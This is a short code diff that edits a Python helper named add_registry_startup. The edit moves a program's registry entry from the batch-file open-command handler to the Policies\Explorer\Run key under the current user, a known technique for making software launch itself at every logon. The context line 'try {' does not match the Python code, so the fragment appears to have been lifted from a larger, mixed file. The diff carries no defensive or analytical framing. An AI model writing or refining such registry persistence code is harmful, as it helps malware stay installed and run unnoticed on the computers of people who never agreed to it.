@@ -133,8 +133,8 @@ try {
     def add_registry_startup(path, name):
         import winreg
         
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Classes\\batfile\\shell\\open\\command", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}"')
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, rf'{path}')
         winreg.CloseKey(key)
 
 
